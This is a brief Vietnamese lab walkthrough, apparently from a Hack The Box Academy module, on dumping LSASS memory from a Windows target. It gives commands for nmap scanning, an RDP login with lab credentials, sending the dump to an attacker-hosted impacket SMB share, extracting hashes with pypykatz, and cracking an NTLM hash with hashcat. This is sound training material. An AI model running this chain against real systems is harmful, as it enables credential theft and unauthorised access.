<h1>Attacking LSASS</h1>

![image](https://github.com/user-attachments/assets/cef1a406-7037-4174-ab60-27b9364d20f0)

![image](https://github.com/user-attachments/assets/bd099709-05b7-4261-9683-55e589629dde)

Như thông thường tôi dùng `nmap -sV 10.129.202.149` để check các port:

![image](https://github.com/user-attachments/assets/94b09b5f-2259-46b6-8d77-fa5d41620abc)

Thấy rdp là kết nối vào thôi `xfreerdp /u:'htb-student' /p:'HTB_@cademy_stdnt!' /v:10.129.202.149`:

![image](https://github.com/user-attachments/assets/8100db85-e609-40a8-a4fb-418d3e8a08e7)

![image](https://github.com/user-attachments/assets/9a29b1a6-7365-4f56-baa4-26bff5c9bfa6)

Bấm vào `create dump file` và nó sẽ được lưu vào đây:

![image](https://github.com/user-attachments/assets/20e2747c-7a85-42ac-9ef9-8287ae4ed584)

Bên máy của htb thì chạy `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1594028` để hứng file từ máy target(window):

![image](https://github.com/user-attachments/assets/913a4de1-e81a-4385-aa97-b14faae000a8)

![image](https://github.com/user-attachments/assets/9bf9258f-7bba-46e9-9b50-175085d10e9d)

![image](https://github.com/user-attachments/assets/75ce42ef-0030-445b-a47c-f1eaf60b078e)

Và tôi đã có ngay file lsass.DMP và dùng [pypykatz](https://github.com/skelsec/pypykatz) để khai thác, có thể tải bằng `pip3 install pypykatz` và dùng luôn `pypykatz lsa minidump lsass.DMP` :

![image](https://github.com/user-attachments/assets/bfb46eef-39c0-4166-a344-31403e10bcca)

Và nhiệm vụ của tôi là tìm user Vendor:

![image](https://github.com/user-attachments/assets/0cfd2419-9d2f-4fce-9035-96aab3418877)

Tôi chạy `sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 rockyou.txt` để brute force và đợi 1 chút là ra: 

![image](https://github.com/user-attachments/assets/f4d41aaf-59d4-407b-a59b-655b99ab77e7)

![image](https://github.com/user-attachments/assets/122064ab-418e-4855-bf19-e95c58f6fd1f)
